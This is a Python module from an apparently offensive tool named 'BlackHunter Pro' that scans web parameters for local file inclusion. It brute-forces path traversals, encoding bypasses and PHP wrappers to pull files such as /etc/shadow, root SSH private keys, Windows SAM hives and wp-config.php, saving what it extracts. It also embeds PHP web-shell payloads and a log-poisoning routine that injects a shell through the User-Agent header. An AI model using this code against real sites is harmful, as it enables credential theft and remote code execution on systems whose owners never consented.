# vulns/lfi.py
# BlackHunter Pro - LFI/RFI Scanner
# Detects: Local File Inclusion, Remote File Inclusion, Path Traversal

import re
import base64
import requests
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from colorama import Fore, Style

import warnings
warnings.filterwarnings("ignore")


class LFIScanner:
    """
    Local/Remote File Inclusion Scanner
    - Basic LFI detection
    - Path Traversal
    - PHP Wrappers exploitation
    - Log Poisoning detection
    - RFI detection
    - Filter Bypass techniques
    """

    # =============================================
    # TARGET FILES
    # =============================================

    LINUX_FILES = [
        '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname',
        '/etc/group', '/etc/issue', '/etc/motd', '/etc/resolv.conf',
        '/etc/crontab', '/etc/fstab', '/etc/apt/sources.list',
        '/etc/ssh/ssh_config', '/etc/ssh/sshd_config',
        '/root/.bash_history', '/root/.ssh/id_rsa',
        '/root/.ssh/authorized_keys', '/root/.my.cnf',
        '/proc/self/environ', '/proc/self/cmdline', '/proc/self/status',
        '/proc/version', '/proc/cpuinfo', '/proc/meminfo',
        '/var/log/apache2/access.log', '/var/log/apache2/error.log',
        '/var/log/nginx/access.log', '/var/log/nginx/error.log',
        '/var/log/auth.log', '/var/log/syslog', '/var/log/messages',
        '/var/www/html/index.php', '/var/www/html/config.php',
        '/var/www/html/wp-config.php', '/var/www/html/.htaccess',
    ]

    WINDOWS_FILES = [
        'C:\\Windows\\win.ini', 'C:\\Windows\\system.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\Windows\\System32\\config\\SAM',
        'C:\\Windows\\System32\\config\\SYSTEM',
        'C:\\Windows\\repair\\SAM',
        'C:\\Windows\\Panther\\Unattend.xml',
        'C:\\boot.ini',
        'C:\\inetpub\\wwwroot\\web.config',
        'C:\\xampp\\apache\\conf\\httpd.conf',
        'C:\\xampp\\php\\php.ini',
    ]

    # =============================================
    # TRAVERSAL SEQUENCES
    # =============================================

    TRAVERSALS = [
        '', '../', '../../', '../../../', '../../../../',
        '../../../../../', '../../../../../../', '../../../../../../../',
        '..\\', '..\\..\\', '..\\..\\..\\', '..\\..\\..\\..\\',
    ]

    # =============================================
    # BYPASS TECHNIQUES
    # =============================================

    BYPASSES = [
        '....//', '....\\\\', '..././', '....\\/',
        '..%2f', '..%5c', '%2e%2e%2f', '%2e%2e%5c',
        '%252e%252e%252f', '..%252f', '..%c0%af', '..%c1%9c',
        '%c0%ae%c0%ae%c0%af', '....//....//', '.../...//',
        '..%00/', '..%00/..%00/',
    ]

    # =============================================
    # PHP WRAPPERS
    # =============================================

    PHP_WRAPPERS = [
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/convert.base64-encode/resource=config.php',
        'php://filter/convert.base64-encode/resource=../index.php',
        'php://filter/convert.base64-encode/resource=../../index.php',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/read=string.rot13/resource=index.php',
        'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd',
        'php://input',
        'php://stdin',
        'php://fd/1',
        'php://temp',
        'php://memory',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
        'data://text/plain,<?php system($_GET["cmd"]); ?>',
        'expect://id',
        'phar:///path/to/file.phar/shell.php',
        'zip:///path/to/file.zip#shell.php',
    ]

    # =============================================
    # SUCCESS INDICATORS
    # =============================================

    SUCCESS_INDICATORS = {
        'passwd': ['root:x:0:0', 'root:!:0:0', 'daemon:x:', 'bin:x:'],
        'shadow': ['root:$', 'root:*', 'root:!'],
        'hosts': ['localhost', '127.0.0.1', '::1'],
        'ssh': ['ssh-rsa', 'ssh-ed25519', 'BEGIN RSA PRIVATE KEY', 'BEGIN OPENSSH PRIVATE KEY'],
        'hostname': ['localhost', 'debian', 'ubuntu', 'centos'],
        'environ': ['DOCUMENT_ROOT=', 'HTTP_USER_AGENT=', 'SERVER_'],
        'cmdline': ['/usr/sbin/', '/usr/bin/'],
        'version': ['Linux version', 'gcc version'],
        'cpuinfo': ['processor', 'model name', 'vendor_id'],
        'meminfo': ['MemTotal', 'MemFree', 'MemAvailable'],
        'access_log': ['GET /', 'POST /', 'HTTP/1.1'],
        'error_log': ['PHP Warning', 'PHP Notice', 'PHP Fatal error', 'AH0'],
        'win_ini': ['[extensions]', '[fonts]', '[mci extensions]'],
        'boot_ini': ['[boot loader]', 'timeout='],
        'web_config': ['<configuration>', '<system.web>', '<appSettings>'],
        'config_php': ['DB_PASSWORD', 'DB_USER', 'mysql_connect', 'database'],
        'htaccess': ['RewriteEngine', 'RewriteRule', 'AuthType'],
    }

    # =============================================
    # LFI-PRONE PARAMETERS
    # =============================================

    LFI_PARAMS = [
        'file', 'filename', 'path', 'page', 'include', 'inc', 'require',
        'template', 'view', 'load', 'read', 'open', 'doc', 'document',
        'folder', 'root', 'dir', 'directory', 'url', 'uri', 'src',
        'source', 'content', 'action', 'name', 'mod', 'module',
        'conf', 'config', 'lang', 'language', 'locale', 'theme',
        'layout', 'section', 'cat', 'category', 'item', 'product',
        'download', 'attachment', 'nav', 'menu',
    ]

    # =============================================
    # INITIALIZATION
    # =============================================

    def __init__(self, target, timeout=10, user_agent=None):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': user_agent or 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.session.verify = False

        self.vulnerabilities = []
        self.extracted_files = []

    # =============================================
    # MAIN RUN
    # =============================================

    def run(self):
        """Execute LFI detection"""
        print(f"{Fore.CYAN}[*] LFI Scanner started")
        print(f"{Fore.CYAN}[*] Target: {self.target}")
        print()

        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        if not params:
            params = self._find_form_params()

        if not params:
            print(f"{Fore.YELLOW}  [-] No parameters found")
            return []

        lfi_params = {k: v for k, v in params.items()
                      if any(name in k.lower() for name in self.LFI_PARAMS)}

        if not lfi_params:
            lfi_params = params

        print(f"{Fore.CYAN}[*] Testing {len(lfi_params)} parameters: {', '.join(lfi_params.keys())}")
        print()

        for param in lfi_params.keys():
            print(f"{Fore.YELLOW}[*] Testing parameter: {param}")
            self._test_parameter(param)

        return self.vulnerabilities

    # =============================================
    # FIND FORM PARAMS
    # =============================================

    def _find_form_params(self):
        """Find parameters from forms"""
        params = {}
        try:
            r = self.session.get(self.target, timeout=self.timeout, verify=False)
            forms = re.findall(r'<form[^>]*>.*?</form>', r.text, re.IGNORECASE | re.DOTALL)

            for form in forms:
                inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form, re.IGNORECASE)
                for inp in inputs:
                    params[inp] = '1'
        except:
            pass
        return params

    # =============================================
    # TEST PARAMETER
    # =============================================

    def _test_parameter(self, param):
        """Test single parameter"""

        # 1. Basic LFI (Linux)
        if self._test_basic_lfi(param, self.LINUX_FILES):
            return

        # 2. Basic LFI (Windows)
        if self._test_basic_lfi(param, self.WINDOWS_FILES):
            return

        # 3. Bypass techniques
        if self._test_bypass(param):
            return

        # 4. PHP wrappers
        if self._test_php_wrappers(param):
            return

    # =============================================
    # BASIC LFI
    # =============================================

    def _test_basic_lfi(self, param, files):
        """Test basic LFI with file list"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for target_file in files:
            for traversal in self.TRAVERSALS[:8]:
                try:
                    if target_file.startswith('/') or target_file.startswith('C:'):
                        payload = traversal + target_file.lstrip('/')
                    else:
                        payload = traversal + target_file

                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload

                    r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                    evidence = self._check_success(r.text, target_file)

                    if evidence:
                        print(f"{Fore.RED}  [!] LFI Found!")
                        print(f"{Fore.RED}      Param: {param}")
                        print(f"{Fore.RED}      Payload: {payload}")
                        print(f"{Fore.RED}      Evidence: {evidence[:60]}")

                        self.vulnerabilities.append({
                            'type': 'LFI (Local File Inclusion)',
                            'url': r.url,
                            'param': param,
                            'payload': payload,
                            'file': target_file,
                            'evidence': evidence[:500],
                            'severity': 'HIGH',
                        })

                        self.extracted_files.append({
                            'file': target_file,
                            'content': r.text[:5000],
                        })
                        return True
                except Exception:
                    continue

        return False

    # =============================================
    # BYPASS TECHNIQUES
    # =============================================

    def _test_bypass(self, param):
        """Test filter bypasses"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        targets = ['etc/passwd', 'etc/hosts', 'windows/win.ini']

        for target_file in targets:
            for bypass in self.BYPASSES:
                try:
                    payload = bypass * 4 + target_file

                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param] = payload

                    r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                    evidence = self._check_success(r.text, target_file)

                    if evidence:
                        print(f"{Fore.RED}  [!] LFI Found (Bypass)!")
                        print(f"{Fore.RED}      Param: {param}")
                        print(f"{Fore.RED}      Payload: {payload}")

                        self.vulnerabilities.append({
                            'type': 'LFI (Filter Bypass)',
                            'url': r.url,
                            'param': param,
                            'payload': payload,
                            'bypass': bypass,
                            'evidence': evidence[:500],
                            'severity': 'HIGH',
                        })
                        return True
                except Exception:
                    continue

        return False

    # =============================================
    # PHP WRAPPERS
    # =============================================

    def _test_php_wrappers(self, param):
        """Test PHP wrappers"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for wrapper in self.PHP_WRAPPERS:
            try:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = wrapper

                r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                if 'convert.base64-encode' in wrapper:
                    b64_match = re.search(r'[A-Za-z0-9+/]{100,}={0,2}', r.text)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group(0)).decode('utf-8', errors='ignore')
                            if any(x in decoded for x in ['<?php', 'root:', 'localhost', 'define(']):
                                print(f"{Fore.RED}  [!] PHP Wrapper Found!")
                                print(f"{Fore.RED}      Param: {param}")
                                print(f"{Fore.RED}      Wrapper: {wrapper}")

                                self.vulnerabilities.append({
                                    'type': 'LFI (PHP Filter Wrapper)',
                                    'url': r.url,
                                    'param': param,
                                    'payload': wrapper,
                                    'decoded': decoded[:500],
                                    'severity': 'HIGH',
                                })
                                return True
                        except:
                            pass

                evidence = self._check_success(r.text, wrapper)
                if evidence:
                    print(f"{Fore.RED}  [!] PHP Wrapper Found!")
                    print(f"{Fore.RED}      Param: {param}")
                    print(f"{Fore.RED}      Wrapper: {wrapper}")

                    self.vulnerabilities.append({
                        'type': 'LFI (PHP Wrapper)',
                        'url': r.url,
                        'param': param,
                        'payload': wrapper,
                        'evidence': evidence[:500],
                        'severity': 'CRITICAL',
                    })
                    return True
            except Exception:
                continue

        return False

    # =============================================
    # SUCCESS CHECK
    # =============================================

    def _check_success(self, response_text, filename):
        """Check if LFI successful"""
        filename_lower = filename.lower()

        for key, indicators in self.SUCCESS_INDICATORS.items():
            if key in filename_lower:
                for indicator in indicators:
                    if indicator in response_text:
                        return indicator

        generic = [
            'root:x:0:0', 'root:!:0:0', '[extensions]',
            'BEGIN RSA PRIVATE KEY', 'BEGIN OPENSSH PRIVATE KEY',
            'DOCUMENT_ROOT=', 'Linux version', '<?php',
        ]

        for ind in generic:
            if ind in response_text:
                return ind

        return None

    # =============================================
    # LOG POISONING
    # =============================================

    def test_log_poisoning(self, param, log_path):
        """Test LFI via log poisoning"""
        original_ua = self.session.headers.get('User-Agent')
        self.session.headers['User-Agent'] = '<?php system($_GET["cmd"]); ?>'

        try:
            self.session.get(self.target, timeout=self.timeout, verify=False)

            parsed = urlparse(self.target)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = parse_qs(parsed.query)

            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = log_path

            r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

            if '<?php system' in r.text or 'cmd=' in r.text:
                print(f"{Fore.RED}  [!] LFI via Log Poisoning!")
                print(f"{Fore.RED}      Param: {param}")
                print(f"{Fore.RED}      Log: {log_path}")

                self.vulnerabilities.append({
                    'type': 'LFI (Log Poisoning)',
                    'url': r.url,
                    'param': param,
                    'log_path': log_path,
                    'severity': 'CRITICAL',
                })
                return True
        except:
            pass
        finally:
            if original_ua:
                self.session.headers['User-Agent'] = original_ua

        return False

    # =============================================
    # FILE READING
    # =============================================

    def read_file(self, param, file_path):
        """Read a specific file via LFI"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)

        for traversal in self.TRAVERSALS:
            try:
                payload = traversal + file_path.lstrip('/')

                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload

                r = self.session.get(base_url, params=test_params, timeout=self.timeout, verify=False)

                if self._check_success(r.text, file_path):
                    return r.text[:10000]
            except:
                continue

        return None

    # =============================================
    # SUMMARY
    # =============================================

    def summary(self):
        """Print summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}  LFI SUMMARY")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"{Fore.GREEN}[+] Files Read:      {len(self.extracted_files)}")

        for v in self.vulnerabilities:
            print(f"{Fore.RED}[!] {v['type']} - {v.get('param', 'N/A')}")

        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")


# =============================================
# EXPORTS
# =============================================

__all__ = ["LFIScanner"]